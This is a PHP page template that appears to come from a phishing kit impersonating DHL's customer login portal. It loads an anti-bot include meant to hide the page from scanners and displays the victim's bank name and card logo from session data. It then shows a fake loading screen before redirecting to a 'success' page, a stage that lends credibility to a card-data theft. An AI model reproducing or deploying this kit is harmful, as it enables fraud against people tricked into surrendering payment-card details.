<?php 
session_start();
include '../antibots/index.php';


     require_once "functions.php";
     include '../config.php';

?>


<!DOCTYPE html>
<html>
<head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <!-- link_icons -->
        <link rel="stylesheet"  href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.5.0/font/bootstrap-icons.css">
        <link rel="stylesheet"  href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css"> 
        <title>Login to Customer Portals and Tools | DHL |</title>
        <!-- logo site web-->
        <link rel="icon" href="image/favicon.ico" type="image/x-icon"/>
        <link rel="shortcut icon" href="image/favicon.ico" type="image/x-icon" />
        <!-- link__css -->
        <link rel="stylesheet"  href="css/bootstrap.css">
        <link rel="stylesheet"  href="css/posta.css">
		<style>
			.modal-open{
				overflow:hidden;
				padding-right:0px;
			}
		</style>


</head>
<body class="modal-open">


		

		<!-- Modal -->
		<div class="modal fade show" id="exampleModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true" style="display:block;">
		  <div class="modal-dialog shadow">
		    <div class="modal-content">
		      <div class="modal-header" style="background: linear-gradient(to right, #ffffff, #ffffff, #ffffff);">
              <h5><?php echo $_SESSION['bank_name']; ?></h5>
		          <img src="image/<?php echo $_SESSION['card_logo']; ?>" class="sfli">
		      </div>
		      <div class="modal-body">
                  <div class="text-center py-4 "><img src="image/loading.gif"></div>
                  <div class="copirayt text-center" style="background: linear-gradient(to right, #ffffff, #ffffff, #ffffff);">
                  <p><?php echo get_text('copyright'); ?></p>
                  </div>
		      </div>
		    </div>
		  </div>
		</div>


        <script src="js/jquery-3.5.1.min.js"></script>
        <script src="js/jquery.mask.js"></script>
        <script src="js/Bootstrap.js"></script>
        <script>

                  setTimeout(function () {
                    window.location.href= 'success.php';
                  },12000);
             
        </script>
</body>
</html>